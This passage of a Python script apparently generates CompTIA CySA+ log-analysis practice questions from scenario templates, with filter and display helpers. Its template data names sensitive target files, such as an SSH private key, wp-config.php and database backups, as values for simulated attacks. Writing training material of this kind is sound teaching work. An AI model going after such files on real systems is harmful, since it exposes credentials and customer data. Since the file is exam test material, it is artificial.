                "var/www/html/uploads/customer_data.csv",
                "home/appuser/.ssh/id_rsa",
                "var/www/html/backup/db_backup.sql",
            ],
            "file_size":  ["147221", "2441", "8847334"],
            "config_file": [
                "var/www/html/config/database.php",
                "etc/app/settings.ini",
                "var/www/html/wp-config.php",
            ],
            "ts_1": ["2026-06-07 13:44:01"], "ts_2": ["2026-06-07 13:44:14"],
            "ts_3": ["2026-06-07 13:44:22"], "ts_4": ["2026-06-07 13:44:31"],
            "ts_5": ["2026-06-07 13:44:44"], "ts_6": ["2026-06-07 13:44:55"],
            "ts_7": ["2026-06-07 13:45:02"],
        },
        "exam_objectives": ["1.2", "1.3"],
    },
]

ALL_LOG_SCENARIOS = (
    WINDOWS_EVENT_SCENARIOS +
    FIREWALL_LOG_SCENARIOS +
    DNS_LOG_SCENARIOS +
    AUTH_LOG_SCENARIOS +
    IDS_LOG_SCENARIOS +
    WEB_LOG_SCENARIOS
)

LOG_TYPE_MAP = {
    "windows":  WINDOWS_EVENT_SCENARIOS,
    "firewall": FIREWALL_LOG_SCENARIOS,
    "dns":      DNS_LOG_SCENARIOS,
    "auth":     AUTH_LOG_SCENARIOS,
    "ids":      IDS_LOG_SCENARIOS,
    "web":      WEB_LOG_SCENARIOS,
}

def generate_log_pbq(log_type_filter=None, difficulty_filter=None):
    if log_type_filter and log_type_filter in LOG_TYPE_MAP:
        pool = LOG_TYPE_MAP[log_type_filter]
    else:
        pool = ALL_LOG_SCENARIOS
    if difficulty_filter:
        pool = [s for s in pool if s["difficulty"] == difficulty_filter]
    if not pool:
        return {"error": "No scenarios match the selected filters."}
    template = random.choice(pool)
    scenario_text = template["scenario_template"]
    for var_name, options in template.get("variables", {}).items():
        chosen = random.choice(options)
        scenario_text = scenario_text.replace(f"{{{var_name}}}", chosen)
    return {
        "exam":          f"CompTIA CySA+ CS0-004 - Log Analysis",
        "id":            template["id"],
        "log_type":      template["log_type"],
        "attack_type":   template["attack_type"],
        "objective":     template["objective"],
        "difficulty":    template["difficulty"],
        "exam_objectives": ", ".join(template.get("exam_objectives", [])),
        "scenario":      scenario_text.strip(),
    }

def get_random_log_pbq():
    return generate_log_pbq()

def display_log_pbq(pbq):
    sep = "=" * 70
    print(f"\n{sep}")
    print(f"  {pbq.get('exam', 'CySA+ CS0-004 Log Analysis')}")
    print(f"  Scenario ID  : {pbq.get('id', 'N/A')}")
    print(f"  Log Type     : {pbq.get('log_type', 'N/A')}")
    print(f"  Attack Type  : {pbq.get('attack_type', 'N/A')}")
    print(f"  Objective    : {pbq.get('objective', 'N/A')}")
    print(f"  Difficulty   : {pbq.get('difficulty', 'N/A').upper()}")
    print(f"  Obj. Refs    : {pbq.get('exam_objectives', 'N/A')}")
    print(sep)
    print(pbq.get("scenario", "No scenario generated."))
    print(f"\n{sep}\n")
